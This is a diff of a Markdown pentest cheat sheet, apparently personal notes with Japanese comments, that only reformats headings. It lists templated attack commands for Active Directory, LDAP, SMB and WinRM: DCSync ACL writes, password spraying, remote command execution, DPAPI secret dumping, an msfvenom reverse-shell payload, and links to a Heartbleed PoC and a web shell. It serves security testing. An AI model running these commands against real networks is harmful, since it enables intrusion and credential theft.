@@ -113,11 +113,11 @@ https://github.com/XiaoliChan/wmiexec-Pro
 
 
 ## 389
-### godap
+- godap
 ```sh
 ./godap 'IP' -u 'USERNAME' -p 'PASSWORD'
 ```
-### impacket
+- impacket-dacledit
 ```sh
 # write
 impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
@@ -128,23 +128,23 @@ impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -a
 # remove
 impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
-### ldapdomaindump
+- ldapdomaindump
 ```sh
 ldapdomaindump -u 'DOMAIN\USERNAME' -p 'PASSWORD' -at NTLM --no-json --no-grep ldap://'IP'
 ```
-### ldapnomnom
+- ldapnomnom
 ```sh
 # LDAP Ping
 ./ldapnomnom -input 'USERLIST' -parallel 'THREAD NUMBER' -server 'IP'
 # rootDSE
 ./ldapnomnom -server 'IP' -dump
 ```
-### LdapRelayScan
-### ldapsearch
+- LdapRelayScan
+- ldapsearch
 ```sh
 ldapsearch -b 'DN' -LLL -s 'sub' -D 'USERNAME@DOMAIN' -H ldap://'IP' -w 'PASSWORD' 'FILTER' 'ATTRIBUTES'
 ```
-### ldeep
+- ldeep
 ```sh
 ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users all
 ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users spn
@@ -201,8 +201,8 @@ ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' smsa
 ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' subnets
 ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' tempaltes
 ```
-### msldap
-### net ads
+- msldap
+- net ads
 ```sh
 net ads info -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # user
@@ -225,7 +225,7 @@ net ads workgroup -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # lookup
 net ads lookup -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 ```
-### netexec
+- netexec
 ```sh
 # Authentication
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
@@ -249,11 +249,11 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
 # Bloodhound Ingestor
 netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
 ```
-### silenthound
+- silenthound
 ```sh
 python3.13 silenthound.py -u 'USERNAME' -p 'PASSWORD' -g -n -k --kerberoast 'IP' 'DOMAIN'
 ```
-### windapsearch
+- windapsearch
 ```sh
 ./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m metadata
 ./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m gpos
@@ -272,45 +272,42 @@ python3.13 silenthound.py -u 'USERNAME' -p 'PASSWORD' -g -n -k --kerberoast 'IP'
 ```
 
 
-
 ## 443
-### nmap
+- nmap
 ```sh
 # heartbleed
 nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
 ```
-### sslscan
+- sslscan
 ```sh
 sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 'IP'
 ```
-### PoC
-- [heartbleed](https://github.com/sensepost/heartbleed-poc)
-
-
+- PoC
+  - [heartbleed](https://github.com/sensepost/heartbleed-poc)
 
 
 
 ## 445 (139を使うことも)
 (msrpcはTCP135番やDynamicPortも使う)
-### donpapi
+- donpapi
 ```sh
 donpapi
 ```
-### hekatomb
+- hekatomb
 ```sh
 # DPAPI blob (TCP53番とTCP389番も使用)
 hekatomb 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
-### enum4linux
+- enum4linux
 ```sh
 # enum4linux-ng のほうが２倍はやい
 enum4linux -a -d -u 'USERNAME' -p 'PASSWORD' -w 'DOMAIN' -v 'IP'
 ```
-### enum4linux-ng
+- enum4linux-ng
 ```sh
 enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 ```
-### impacket
+- impacket
 ```sh
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -name 'USERNAME'
@@ -349,7 +346,7 @@ impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/
 impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows or ShellBrowserWindow or MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
-### netexec
+- netexec
 ```sh
 # Password Spraying
 netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
@@ -390,7 +387,7 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'wmiexec' -x '
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x 'COMMAND'
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
 ```
-### net rpc
+- net rpc
 ```sh
 net rpc info -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # user
@@ -434,7 +431,7 @@ net rpc registry save 'KEYPATH' 'REMOTEPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'I
 # shell
 net rpc shell -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 ```
-### rpcclient
+- rpcclient
 ```sh
 # WINREG
 rpcclient $> winreg_enumkey 'KEYPATH'
@@ -534,12 +531,12 @@ rpcclient $> getusername
 rpcclient $> epmmap
 rpcclient $> epmlookup
 ```
-### smbclient
+- smbclient
 ```sh
 smbclient -L 'HOST' -U 'DOMAIN/USERNAME%PASSWORD'
 smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
 ```
-### smbmap
+- smbmap
 ```sh
 smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g 'OUTPUT.txt'
 smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g 'OUTPUT.txt'
@@ -551,24 +548,22 @@ smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursiv
   ```
 
 
-
 ## 5060 (UDP)
+- svwar
 ```sh
 svwar -t 'Duration' -e 'EXTENSION RANGE' -m INVITE 'IP'
 ```
 
 
-
 ## 5985
-### evil-winrm
+- evil-winrm
 ```sh
 evil-winrm -i 'IP' -u 'USERNAME' -p 'PASSWORD'
 ```
-### netexec
+- netexec
 ```sh
 netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
 ```
-
 
 
 ## escalation
@@ -601,33 +596,33 @@ history
 
 
 ## kali
-### gpp-decrypt
+- gpp-decrypt
 ```sh
  gpp-decrypt "Groups.xmlのcpassword"
 ```
-### impacket-smbserver
+- impacket-smbserver
 ```sh
 impacket-smbserver 'SHARENAME' 'PATH'
 # smbv1が無効の場合は
 impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```
-### msfvenom
+- msfvenom
 ```sh
 msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o 'OUTPUT'
 ```
-### name-that-hash
+- name-that-hash
 ```sh
 name-that-hash -f 'hash.txt' --no-banner --no-john
 ```
-### openssl
+- openssl
 ```sh
 openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
 ```
-### username-anarchy
+- username-anarchy
 ```sh
 ./username-anarchy -i userlist.txt > user.txt
 ```
-### phpbash
+- phpbash
 [phpbash](https://github.com/Arrexel/phpbash)
 
 
